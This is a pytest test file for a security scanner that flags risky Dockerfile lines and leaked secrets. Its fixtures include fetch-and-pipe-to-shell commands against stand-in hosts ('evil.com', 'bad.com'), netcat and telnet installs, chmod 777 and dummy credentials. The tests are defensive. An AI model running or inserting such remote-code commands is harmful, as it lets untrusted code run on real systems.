from __future__ import annotations

from acorn.security import (
    check_sensitive_info,
    format_findings,
    scan_file_for_dangerous,
    scan_template,
)


def test_scan_file_for_dangerous_curl_bash(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("RUN curl https://evil.com/script.sh | bash\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1
    assert findings[0]["severity"] == "high"
    assert "curl" in findings[0]["message"]


def test_scan_file_for_dangerous_wget_sh(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("RUN wget http://bad.com/payload | sh\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1
    assert findings[0]["severity"] == "high"


def test_scan_file_for_dangerous_user_root(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("USER root\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1
    assert findings[0]["severity"] == "low"


def test_scan_file_for_dangerous_chmod_777(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("RUN chmod 777 /var/www\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1
    assert findings[0]["severity"] == "high"


def test_scan_file_for_dangerous_env_secret(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("ENV SECRET=super-secret\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1
    assert findings[0]["severity"] == "high"


def test_scan_file_for_dangerous_env_password(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("ENV PASSWORD=abc123\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1


def test_scan_file_for_dangerous_env_token(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("ENV TOKEN=xyz\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1


def test_scan_file_for_dangerous_env_api_key(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("ENV API_KEY=abc\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1


def test_scan_file_for_dangerous_sudo(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("RUN sudo apt-get update\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1
    assert findings[0]["severity"] == "medium"


def test_scan_file_for_dangerous_safe_file(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("FROM python:3.11\nRUN pip install requests\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 0


def test_scan_file_for_dangerous_nonexistent(tmp_path):
    findings = scan_file_for_dangerous(tmp_path / "nope")
    assert len(findings) == 0


def test_scan_file_for_dangerous_binary(tmp_path):
    f = tmp_path / "data.bin"
    f.write_bytes(b"\x00\x01\x02\x03")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 0


def test_scan_template_with_dangerous_file(tmp_path):
    (tmp_path / "build.sh").write_text("#!/bin/sh\nRUN curl https://evil.com/payload | bash\n")
    findings = scan_template(tmp_path)
    assert len(findings) == 1
    assert findings[0]["severity"] == "high"


def test_scan_template_multiple_extensions(tmp_path):
    (tmp_path / "Dockerfile").write_text("USER root\n")
    (tmp_path / "script.py").write_text("# nothing dangerous\n")
    findings = scan_template(tmp_path)
    root_findings = [f for f in findings if "root" in f["message"]]
    assert len(root_findings) == 1


def test_scan_template_empty_dir(tmp_path):
    findings = scan_template(tmp_path)
    assert len(findings) == 0


def test_scan_template_skips_unknown_extensions(tmp_path):
    (tmp_path / "readme.txt").write_text("RUN curl https://evil.com | bash\n")
    findings = scan_template(tmp_path)
    assert len(findings) == 0


def test_check_sensitive_info_password_quoted(tmp_path):
    f = tmp_path / ".env"
    f.write_text('PASSWORD="hunter2"\n')
    findings = check_sensitive_info(f)
    assert len(findings) >= 1


def test_check_sensitive_info_aws_key(tmp_path):
    f = tmp_path / "config"
    f.write_text('aws_key = "AKIAIOSFODNN7EXAMPLE"\n')
    findings = check_sensitive_info(f)
    assert len(findings) >= 1


def test_check_sensitive_info_private_key(tmp_path):
    f = tmp_path / "key.pem"
    f.write_text("-----BEGIN RSA PRIVATE KEY-----\nABCDEF\n-----END RSA PRIVATE KEY-----\n")
    findings = check_sensitive_info(f)
    assert len(findings) >= 1


def test_check_sensitive_info_api_key_quoted(tmp_path):
    f = tmp_path / "config"
    f.write_text("API_KEY='sk-1234567890abcdef'\n")
    findings = check_sensitive_info(f)
    assert len(findings) >= 1


def test_check_sensitive_info_clean(tmp_path):
    f = tmp_path / "clean.txt"
    f.write_text("hello world\n")
    findings = check_sensitive_info(f)
    assert len(findings) == 0


def test_check_sensitive_info_nonexistent(tmp_path):
    findings = check_sensitive_info(tmp_path / "nope")
    assert len(findings) == 0


def test_format_findings_empty():
    output = format_findings([])
    assert output == ""


def test_format_findings_with_results():
    findings = [
        {"file": "/test/Dockerfile", "line": 5, "severity": "high", "message": "Test high", "match": "test"},
        {"file": "/test/Dockerfile", "line": 10, "severity": "medium", "message": "Test med", "match": "test"},
    ]
    output = format_findings(findings)
    assert "HIGH" in output
    assert "MED" in output
    assert "Test high" in output
    assert "Test med" in output


def test_scan_file_for_dangerous_add_remote(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("ADD https://example.com/file.tar.gz /opt/\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1
    assert findings[0]["severity"] == "medium"


def test_scan_file_for_dangerous_telnet(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("RUN apt-get install -y telnet\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1
    assert findings[0]["severity"] == "medium"


def test_scan_file_for_dangerous_netcat(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("RUN apt-get install -y netcat\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1
    assert findings[0]["severity"] == "medium"


def test_scan_file_for_dangerous_multi_stage_copy_root(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("COPY --from=build /root/app /app\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1
    assert findings[0]["severity"] == "low"


def test_scan_file_for_dangerous_chmod_recursive(tmp_path):
    f = tmp_path / "Dockerfile"
    f.write_text("RUN chmod -R 777 /data\n")
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 1
    assert findings[0]["severity"] == "high"


def test_scan_file_for_dangerous_oserror(tmp_path):
    f = tmp_path / "locked"
    f.write_text("safe")
    import stat
    f.chmod(0o000)
    findings = scan_file_for_dangerous(f)
    assert len(findings) == 0
    f.chmod(0o644)


def test_check_sensitive_info_oserror(tmp_path):
    f = tmp_path / "locked"
    f.write_text("PASSWORD=x")
    import stat
    f.chmod(0o000)
    findings = check_sensitive_info(f)
    assert len(findings) == 0
    f.chmod(0o644)


def test_check_sensitive_info_token_quoted(tmp_path):
    f = tmp_path / "config"
    f.write_text("token = 'abc123'\n")
    findings = check_sensitive_info(f)
    assert len(findings) >= 1


def test_check_sensitive_info_private_key_unquoted(tmp_path):
    f = tmp_path / "key.pem"
    f.write_text("-----BEGIN PRIVATE KEY-----\nXYZ\n-----END PRIVATE KEY-----\n")
    findings = check_sensitive_info(f)
    assert len(findings) >= 1


def test_format_findings_low_severity():
    findings = [
        {"file": "/test/Dockerfile", "line": 3, "severity": "low", "message": "Low risk", "match": "test"},
    ]
    output = format_findings(findings)
    assert "LOW" in output
